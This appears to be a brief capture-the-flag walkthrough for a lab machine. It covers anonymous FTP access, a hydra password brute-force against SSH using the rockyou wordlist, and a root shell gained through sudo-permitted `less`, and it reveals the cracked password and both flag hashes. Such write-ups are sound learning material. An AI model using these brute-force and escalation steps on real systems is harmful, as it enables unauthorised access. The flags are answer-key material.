# user flag
`nmap` -- `ftp` and `ssh`  
ftp allows anonymous login  
found `note_to_jake.txt` stating that his password is really weak  
used hydra to crack the password `hydra -l jake -P /usr/share/wordlists/rockyou.txt`  
`jake - 987654321`  
ssh into the machine `ssh jake@IP`  

found flag in `/home/holt/user.txt`
<details>
<summary>user.txt</summary>
ee11cbb19052e40b07aac0ca060c23ee
</details>  

# root flag
`sudo -l` showed that less could be run as root --> `sudo less /etc/profile` `!/bin/sh`  
upgrade shell -- `python3 -c "import pty; pty.spawn('/bin/bash')"` --> `export TERM=xterm` for autocomplete, history, etc  

found in `/root/root.txt`  
<details>
<summary>root.txt</summary>
63a9f0ea7bb98050796b649e85481845
</details>  
